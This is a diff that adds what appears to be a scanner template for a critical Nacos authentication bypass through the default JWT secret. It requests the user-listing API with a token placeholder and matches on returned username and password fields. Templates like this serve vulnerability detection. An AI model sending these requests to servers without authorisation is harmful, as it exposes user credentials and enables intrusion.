@@ -1,0 +1,32 @@
+id: nacos-authentication-bypass
+brief:
+    title: Nacos < 2.2.0 - Authentication Bypass
+    by: Esonhugh
+    level: critical
+    about: The authentication function of Nacos is can be bypass through default JWT secret.
+    label:
+        - auth-bypass
+        - nacos
+        - misconfig
+        - jwt
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+        - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+      signs:
+        - "on": word
+          has:
+            - '"username":'
+            - '"password":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
